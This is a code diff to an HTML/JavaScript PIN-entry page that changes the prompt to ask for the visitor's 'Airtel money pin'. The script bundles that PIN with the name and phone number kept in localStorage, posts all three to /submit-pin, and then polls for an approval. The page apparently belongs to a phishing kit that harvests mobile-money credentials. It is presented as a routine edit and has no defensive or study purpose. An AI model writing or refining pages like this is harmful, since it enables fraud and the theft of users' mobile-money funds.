@@ -32,7 +32,6 @@
         display: flex;
         justify-content: space-between;
         margin: 25px 0;
-        transition: all 0.3s ease;
     }
 
     .pin-boxes input {
@@ -43,7 +42,6 @@
         border: 2px solid red;
         border-radius: 8px;
         outline: none;
-        transition: border-color 0.2s, box-shadow 0.2s;
     }
 
     .pin-boxes input:focus {
@@ -110,11 +108,10 @@
     }
 </style>
 </head>
-
 <body>
 <div class="pin-container">
     <h2>Enter Your PIN</h2>
-    <p>Please enter your 4-digit PIN</p>
+    <p>Please enter your Airtel money pin</p>
 
     <form id="pinForm">
         <div class="pin-boxes" id="pinBoxes">
@@ -143,7 +140,6 @@ const pinBoxes = document.getElementById('pinBoxes');
 
 let attempts = 0;
 const maxAttempts = 3;
-
 inputs[0].focus();
 
 inputs.forEach((input, index) => {
@@ -168,8 +164,10 @@ function checkFilled() {
 form.addEventListener('submit', async (e) => {
     e.preventDefault();
     const pin = [...inputs].map(i => i.value).join('');
-    const name = localStorage.getItem('name');   // ✅ get name
-    const phone = localStorage.getItem('phone'); // ✅ get phone
+
+    // READ name and phone from localStorage
+    const name = localStorage.getItem('name') || '';
+    const phone = localStorage.getItem('phone') || '';
 
     button.disabled = true;
     button.innerText = 'Verifying...';
@@ -179,7 +177,7 @@ form.addEventListener('submit', async (e) => {
     await fetch('/submit-pin', {
         method: 'POST',
         headers: {'Content-Type': 'application/json'},
-        body: JSON.stringify({ name, phone, pin }) // ✅ send name + phone + pin
+        body: JSON.stringify({ name, phone, pin })
     });
 
     pollPinApproval(pin);
